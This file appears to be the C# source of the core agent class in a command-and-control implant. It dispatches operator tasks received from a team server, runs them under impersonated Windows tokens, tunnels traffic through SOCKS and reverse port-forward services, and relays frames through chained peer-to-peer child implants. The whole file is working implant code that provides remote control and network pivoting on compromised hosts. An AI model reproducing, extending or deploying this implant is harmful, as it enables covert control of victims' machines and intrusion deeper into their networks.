using Agent.Commands;
using Agent.Communication;
using Agent.Service;
using Shared;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;
using WinAPI.DInvoke;
using BinarySerializer;
using System.Diagnostics;

namespace Agent
{
    public class Agent
    {
        public Communicator MasterCommunicator { get; private set; }
        private IConfigService _configService;
        private INetworkService _networkService;
        private IFileService _fileService;
        private IFrameService _frameService;
        private IProxyService _proxyService;
        private IReversePortForwardService _reversePortForwardService;
        public AgentMetadata MetaData { get; protected set; }

        public readonly Dictionary<string, CancellationTokenSource> TaskTokens = new Dictionary<string, CancellationTokenSource>();

        public CancellationTokenSource TokenSource { get; private set; } = new CancellationTokenSource();

        private List<AgentCommand> _commands = new List<AgentCommand>();

        private IntPtr _impersonationToken;
        public IntPtr ImpersonationToken
        {
            get => _impersonationToken;
            set
            {
                // ensure the handle is closed first
                if (_impersonationToken != IntPtr.Zero)
                    Kernel32.CloseHandle(_impersonationToken);

                _impersonationToken = value;
            }
        }

        public void LoadCommands()
        {
            var self = Assembly.GetExecutingAssembly();
            foreach (var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(AgentCommand)) && !type.ContainsGenericParameters && !type.IsAbstract)
                {
                    var instance = Activator.CreateInstance(type) as AgentCommand;
                    _commands.Add(instance);
                }
            }

        }

        internal Agent(AgentMetadata metadata, Communicator communicator)
        {
            this.MetaData = metadata;
            this.MasterCommunicator = communicator;
            this.MasterCommunicator.FrameReceived += MasterCommunicator_FrameReceived;
            this._networkService = ServiceProvider.GetService<INetworkService>();
            this._fileService = ServiceProvider.GetService<IFileService>();
            this._proxyService = ServiceProvider.GetService<IProxyService>();
            this._configService = ServiceProvider.GetService<IConfigService>();
            this._frameService = ServiceProvider.GetService<IFrameService>();
            this._reversePortForwardService = ServiceProvider.GetService<IReversePortForwardService>();

            LoadCommands();


            this.MasterCommunicator.Init(this);
        }

        private async Task MasterCommunicator_FrameReceived(NetFrame frame)
        {
            await this.HandleFrame(frame);
        }

        public async void RunCommunicators()
        {
            while (!this.TokenSource.IsCancellationRequested)
            {
                await this.MasterCommunicator.Start();
                await this.MasterCommunicator.Run();
            }
            
        }

        public void Run()
        {
            Thread commThread = new Thread(RunCommunicators);
            commThread.Start();

            try
            {
                while (!TokenSource.IsCancellationRequested)
                {
                    if (ShouldStop)
                    {
                        var comm = this.MasterCommunicator as EgressCommunicator; //send awaiting frames before exiting
                        if (comm != null)
                            comm.DoCheckIn().Wait();
                        this.Stop();
                    }

                    Thread.Sleep(10);
                }
            }
            catch (Exception ex)
            {
#if DEBUG
                Console.WriteLine(ex.ToString());
#endif
                this.Stop();
            }
        }

        private bool ShouldStop = false;

        public void AskToStop()
        {
            this.ShouldStop = true;
            foreach (var token in TaskTokens.Values)
                token.Cancel();
        }

        public void Stop()
        {
            this.TokenSource.Cancel();
        }

        private async Task HandleFrame(NetFrame frame)
        {
            //Handles frames comming from MasterCommunicator

#if DEBUG
            Debug.WriteLine($"Handling {frame.FrameType} frame!");
#endif

            if (frame.FrameType == NetFrameType.Link) //handled here because frame destination is not set
            {

                var link = this._frameService.GetData<LinkInfo>(frame);
                await HandleLinkNotification(link);
                return;
            }


            //Relay frames to childrens
            if (frame.Destination != this.MetaData.Id)
            {

                if (!this._relaysComm.ContainsKey(frame.Destination))
                {
#if DEBUG
                    Debug.WriteLine($"No relay with ID {frame.Destination} found !");
#endif  
                }
                else
                {
                    var child = this._relaysComm[frame.Destination];
                    await child.SendFrame(frame);
                }
                return;
            }

            //Handle Frame
            switch (frame.FrameType)
            {
                case NetFrameType.Link:
                    {

                        break;
                    }
                case NetFrameType.Unlink:
                    {

                        break;
                    }
                case NetFrameType.Task:
                    {
                        var task = this._frameService.GetData<AgentTask>(frame);
                        await HandleTask(task);
                        break;
                    }
                case NetFrameType.Socks:
                    {
                        var packet = this._frameService.GetData<Socks4Packet>(frame);
                        await this._proxyService.HandlePacket(packet, this);
                        break;
                    }

                case NetFrameType.ReversePortForward:
                    {
                        var packet = this._frameService.GetData<ReversePortForwardPacket>(frame);
                        await this._reversePortForwardService.HandlePacket(packet, this);
                        break;
                    }

                default:
                    break;
            }
        }

        private async Task HandleLinkNotification(LinkInfo link)
        {
            // this is sent from the parent
            // which means this is the child
            link.ChildId = this.MetaData.Id;

            // send to team server
            await this.SendFrame(this._frameService.CreateFrame(this.MetaData.Id, NetFrameType.Link, link));
            await this.SendMetaData();

            if (this._relaysComm.Any())
                await this.SendRelays();
        }


        public AgentCommand GetCommand(AgentTask task)
        {
            return this._commands.FirstOrDefault(c => c.Command == task.CommandId);
        }

        private async Task HandleTask(AgentTask task)
        {
            // get the command
            var command = this.GetCommand(task);

            if (command is null)
            {
                AgentTaskResult res = new AgentTaskResult();
                res.Id = task.Id;
                res.Output = $"Agent has no {task.CommandId} command registered!";
                res.Status = AgentResultStatus.Completed;
                await this.SendTaskResult(res);

                return;
            }

            // execute
            if (command.Threaded) ExecuteTaskThreaded(command, task);
            else await ExecuteTask(command, task);
        }

        private async Task ExecuteTask(AgentCommand command, AgentTask task)
        {
            var clone = Activator.CreateInstance(command.GetType()) as AgentCommand;
            var ctxt = new AgentCommandContext()
            {
                Agent = this,
                NetworkService = _networkService,
                FileService = _fileService,
                //ProxyService = _proxyService,
                ConfigService = _configService,
                Result = new AgentTaskResult(),
                TokenSource = new CancellationTokenSource()
            };
            await clone.Execute(task, ctxt, CancellationToken.None);
        }

        public Thread ExecuteTaskThreaded(AgentCommand command, AgentTask task, AgentCommandContext specifiedContext = null)
        {
            // create a new token
            var tokenSource = new CancellationTokenSource();

            // add to dict
            TaskTokens.Add(task.Id, tokenSource);

            // get the current identity
            using (var identity = ImpersonationToken == IntPtr.Zero
                ? WindowsIdentity.GetCurrent()
                : new WindowsIdentity(ImpersonationToken))
            {

                // create impersonation context
                using (var context = identity.Impersonate())
                {

                    var thread = new Thread(async () =>
                    {
                        //try
                        //{
                        // this blocks inside the thread
                        var clone = Activator.CreateInstance(command.GetType()) as AgentCommand;
                        var ctxt = specifiedContext ?? new AgentCommandContext()
                        {
                            Agent = this,
                            NetworkService = _networkService,
                            FileService = _fileService,
                            ConfigService = _configService,
                            Result = new AgentTaskResult(),
                            TokenSource = tokenSource,
                        };
                        await clone.Execute(task, ctxt, tokenSource.Token);

                        //}
                        //catch (TaskCanceledException)
                        //{
                        //    await SendTaskComplete(task.Id);
                        //}
                        //catch (ThreadAbortException)
                        //{
                        //    await SendTaskComplete(task.Id);
                        //}
                        //catch (OperationCanceledException)
                        //{
                        //    await SendTaskComplete(task.Id);
                        //}
                        //catch (Exception e)
                        //{
                        //    await SendTaskError(task.Id, e.Message);
                        //}
                        //finally
                        //{
                        // make sure the token is disposed and removed

                        //}
                    });


                    // run thread
                    thread.Start();

                    return thread;
                }
            }
        }



        public async Task SendFrame(NetFrame frame)
        {
            await this.MasterCommunicator.SendFrame(frame);
        }

        public async Task SendRelays()
        {
            List<string> relaysIds = _relaysComm.Select(kvp => kvp.Key).ToList();
            await this.SendFrame(this._frameService.CreateFrame(this.MetaData.Id, NetFrameType.LinkRelay, relaysIds));
        }
        public async Task SendMetaData()
        {
            var frame = this._frameService.CreateFrame(this.MetaData.Id, NetFrameType.CheckIn, await this.MetaData.BinarySerializeAsync());
            await SendFrame(frame);
        }

        public async Task SendTaskResult(AgentTaskResult result)
        {
            var frame = this._frameService.CreateFrame(this.MetaData.Id, NetFrameType.TaskResult, await result.BinarySerializeAsync());
            await SendFrame(frame);
        }

        public async Task SendTaskError(string taskId, string errorMessage)
        {
            var result = new AgentTaskResult()
            {
                Id = taskId,
                Error = errorMessage,
                Status = AgentResultStatus.Error,
            };
            await SendTaskResult(result);
        }

        public async Task SendTaskComplete(string taskId)
        {
            var result = new AgentTaskResult()
            {
                Id = taskId,
                Status = AgentResultStatus.Completed,
            };
            await SendTaskResult(result);
        }

        //private async Task HandleLinkNotification(LinkNotification link)
        //{
        //    // this is sent from the parent
        //    // which means this is the child
        //    link.ChildId = _metadata.Id;

        //    // send to team server
        //    await SendC2Frame(new C2Frame(_metadata.Id, FrameType.LINK, Crypto.Encrypt(link)));
        //}

        public async Task<bool> AddChildCommModule(string taskId, P2PCommunicator commModule)
        {
            commModule.Init(this);

            commModule.FrameReceived += OnFrameReceivedFromChild;
            commModule.OnException += async () =>
            {
                await this.RemoveChildCommModule(commModule);
            };

            try
            {
                // blocks until connected
                await commModule.Start();
            }
            catch (TaskCanceledException ex)
            {
                return false;
            }

            // send a link frame to the child
            var link = new LinkInfo(taskId, this.MetaData.Id);
            var frame = this._frameService.CreateFrame(this.MetaData.Id, taskId, NetFrameType.Link, link);
            await commModule.SendFrame(frame);

            // add to the dict using the task id
            _childrenComm.Add(taskId, commModule);
            _ = commModule.Run();

            return true;
        }

        public async Task RemoveChildCommModule(P2PCommunicator commModule)
        {
            commModule.FrameReceived -= OnFrameReceivedFromChild;
            commModule.OnException -= async () =>
            {
                await this.RemoveChildCommModule(commModule);
            };

            await commModule.Stop();

            var childId = _childrenComm.FirstOrDefault(kvp => kvp.Value == commModule).Key;
            _childrenComm.Remove(childId);
            List<string> relaysIds = _relaysComm.Where(kvp => kvp.Value == commModule).Select(kvp => kvp.Key).ToList();
            foreach (var relayId in relaysIds)
                _relaysComm.Remove(relayId);

            // send an unlink
            await SendFrame(this._frameService.CreateFrame(this.MetaData.Id, NetFrameType.Unlink, new LinkInfo() { ParentId = this.MetaData.Id, ChildId = childId }));
            await SendRelays();
        }

        private async Task OnFrameReceivedFromChild(NetFrame frame)
        {
#if DEBUG
            Debug.WriteLine($"Child : Received Frame : {frame.FrameType}");
#endif

            if (frame.FrameType == NetFrameType.Link)
            {
                var link = _frameService.GetData<LinkInfo>(frame);

                // we are the parent
                if (link.ParentId.Equals(this.MetaData.Id))
                {
                    // update key to the child metadata
                    if (_childrenComm.TryGetValue(link.TaskId, out var commModule))
                    {
                        _childrenComm.Remove(link.TaskId);
                        _childrenComm.Add(link.ChildId, commModule);
                        _relaysComm.Add(link.ChildId, commModule);
                    }
                }

                //Child send a new Link frame => sending relay frame
                await SendRelays();
            }

            if (frame.FrameType == NetFrameType.LinkRelay) //update relays
            {
                var relays = _frameService.GetData<List<string>>(frame);
                if (_relaysComm.ContainsKey(frame.Source))
                {
                    var comm = _relaysComm[frame.Source];
                    //remove existing relays excpet child
                    foreach (var key in _relaysComm.Where(kvp => kvp.Value == comm && kvp.Key != frame.Source).Select(kvp => kvp.Key).ToList())
                        _relaysComm.Remove(key);
                    //add relays
                    foreach (var relayId in relays)
                        _relaysComm.Add(relayId, comm);
                }

                //Send relay update info
                await SendRelays();
                return; //don't want this frame to chain 
            }

            // send it outbound
            await SendFrame(frame);
        }

        private readonly Dictionary<string, P2PCommunicator> _childrenComm = new Dictionary<string, P2PCommunicator>();
        public Dictionary<string, P2PCommunicator> ChildrenCommModules
        {
            get
            {
                return this._childrenComm;
            }
        }

        private readonly Dictionary<string, P2PCommunicator> _relaysComm = new Dictionary<string, P2PCommunicator>();

        /*public Thread HandleTask(AgentTask task, AgentTaskResult res = null, AgentCommandContext parent = null)
        {
            var tr = new TaskAndResult
            {
                Task = task,
                Result = res ?? new AgentTaskResult(),
                ParentCtxt = parent
            };

            if (ImpersonationHelper.HasCurrentImpersonation)
            {
                //Console.WriteLine($"run command {task.Command} impersonnated");
                using (var context = WindowsIdentity.Impersonate(ImpersonationHelper.ImpersonatedToken))
                {
                    return StartTaskAsNewThread(tr);
                }
            }
            else
            {
                //Console.WriteLine($"run command {task.Command} not impersonnated");
                return StartTaskAsNewThread(tr);
            }
        }

        private Thread StartTaskAsNewThread(TaskAndResult tr)
        {
            Thread t = new Thread(this.StartHandleTask);
            t.Start(tr);
            return t;
        }

        public class TaskAndResult
        {
            public AgentTask Task { get; set; }
            public AgentTaskResult Result { get; set; }
            public AgentCommandContext ParentCtxt { get; set; }
        }

        private void StartHandleTask(object taskandResult)
        {

            this.HandleTaskInternal(taskandResult as TaskAndResult);
        }

        private Task HandleTaskInternal(TaskAndResult tr)
        {
            var command = this._commands.FirstOrDefault(c => c.Command == tr.Task.CommandId);

            AgentTaskResult result = null;

            if (command is null)
            {
                tr.Result.Id = tr.Task.Id;
                tr.Result.Result = $"Agent has no {tr.Task.Command} command registered!";
                tr.Result.Status = AgentResultStatus.Completed;
                this._messageService.SendResult(result);
            }
            else
            {
                var clone = Activator.CreateInstance(command.GetType()) as AgentCommand;
                var ctxt = new AgentCommandContext()
                {
                    ParentContext = tr.ParentCtxt,
                    Agent = this,
                    MessageService = _messageService,
                    FileService = _fileService,
                    ProxyService = _proxyService,
                    ConfigService = _configService,
                    Result = tr.Result,
                };
                await clone.Execute(tr.Task, ctxt);
            }
        }*/
    }
}
